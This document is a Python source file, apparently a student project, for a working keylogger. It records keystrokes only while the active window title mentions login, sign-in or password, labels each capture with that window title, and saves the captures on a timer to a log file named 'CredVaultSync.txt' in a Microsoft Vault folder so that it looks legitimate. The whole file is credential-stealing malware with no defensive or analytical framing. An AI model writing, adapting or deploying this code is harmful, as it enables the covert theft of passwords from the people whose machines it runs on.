# Author: Winter Sager wrs9226@g.rit.edu

from pynput import keyboard
import logging
import threading
import pygetwindow as gw
import os
# Keyboard needed to grab key events

path = r"C:\Users\AppData\Roaming\Microsoft\Vault\CredVaultSync.txt"

# if path does not exist, make it.
if not os.path.exists(os.path.dirname(path)):
    os.makedirs(os.path.dirname(path))
buffer = ""
last_window = ""
time_interval = 90

logging.basicConfig(filename=path, level=logging.DEBUG, format="%(asctime)s: %(message)s")

def log_when_pressed(key):
    global buffer, last_window
    log_file = "keys.txt"
    # file to log to
    try: #error handling
        current_window = gw.getActiveWindowTitle()
        
        # Only grab the key/password if it is involved in a login
        targets = ["Login", "Sign In", "Password"]

        if any(target.lower() in current_window.lower() for target in targets):
            # makes a note of what is being displayed when the password is logged
            if current_window != last_window:
                buffer += f"\n[Target: {current_window}]\n"
                last_window = current_window

            #Log whatever the key is and attribute error will log special characters
            try:
                buffer += key.char
            except AttributeError:
                if key == keyboard.Key.space: buffer += " "
                elif key == keyboard.Key.enter: buffer += "\n"
                else: buffer += f"[{key}]"    
        else:
            # if the window is not related to logins, skip it
            pass
    except Exception:
        pass

def write_log():
    # write to the log
    global buffer
    threading.Timer(time_interval, write_log).start()
    if buffer:
        logging.info(buffer)
        buffer = ""

def main():
    #start logging. 
    print("Listening")    
    write_log()
    with keyboard.Listener(on_press=log_when_pressed) as listener:
        listener.join()


if __name__ == "__main__":
    main()
